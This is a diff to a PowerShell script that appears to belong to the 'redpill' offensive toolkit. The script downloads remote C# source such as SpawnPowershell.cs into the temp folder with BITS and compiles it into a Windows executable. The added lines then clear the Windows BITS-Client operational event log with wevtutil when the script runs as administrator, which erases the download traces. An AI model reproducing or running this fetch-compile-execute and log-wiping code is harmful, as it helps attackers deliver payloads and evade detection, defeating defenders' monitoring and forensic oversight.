@@ -162,7 +162,7 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
 
       ## Use BitsTransfer to download our script.CS to %tmp% location!
       # iwr -Uri "$Uri" -OutFile "${Env:TMP}\${StripName}" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
-      $StripName = $Uri.Split('/')[-1] ## https://raw.githubusercontent.com/../calc.cs => $Env:TMP\out.cs
+      $StripName = $Uri.Split('/')[-1] ## https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs => $Env:TMP\SpawnPowershell.cs
       Start-BitsTransfer -priority foreground -Source "$Uri" -Destination "${Env:TMP}\${StripName}" -ErrorAction SilentlyContinue|Out-Null
       $ORIGINALURL = "$Uri";$Uri = "${Env:TMP}\${StripName}" ## Define $Uri variable again!
 
@@ -215,7 +215,10 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
       If($IconSet -ieq "True"){## Compile binary.exe with @redpill icon!
          
          If(-not(Test-Path -Path "$IconFile" -EA SilentlyContinue)){## Download icon from @redpill repo => IF does NOT exist!
-            iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/utils/redpillIcon1.ico -OutFile $IconFile -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0" -ErrorAction SilentlyContinue -WarningAction SilentlyContinue|Out-Null         
+
+            ## iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/redpillIcon1.ico -OutFile $IconFile -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0" -ErrorAction SilentlyContinue -WarningAction SilentlyContinue|Out-Null         
+            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/redpillIcon1.ico -Destination "$IconFile" -ErrorAction SilentlyContinue|Out-Null
+
          }
 
          $CmdLine = "/nologo /target:winexe /win32icon:$IconFile /out:$OutFile $Uri" ## add redpill icon to binary.exe
@@ -311,10 +314,24 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
 }
 
 
-## Delete all artifacts left behind
+<#
+.SYNOPSIS
+   Helper - Delete ALL artifacts left behind!
+
+.NOTES
+   This function will delete Bits-Transfer logfiles from eventvwr
+   SnapIn if CsOnTheFly its executed with Administrator privileges!
+#>
+
 If(Test-Path -Path "$Env:TMP\OutputTable.log" -EA SilentlyContinue){
    Remove-Item -Path "$Env:TMP\OutputTable.log" -Force
 }
 If(Test-Path -Path "$IconFile" -EA SilentlyContinue){
    Remove-Item -Path "$IconFile" -Force
+}
+
+$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+If($IsClientAdmin){## Clean ALL BITS-TRANSFER logfiles!
+   ## Bits Log: Microsoft-Windows-BITS-Client/Operational log.evtx
+   wevtutil cl "Microsoft-Windows-Bits-Client/Operational"
 }
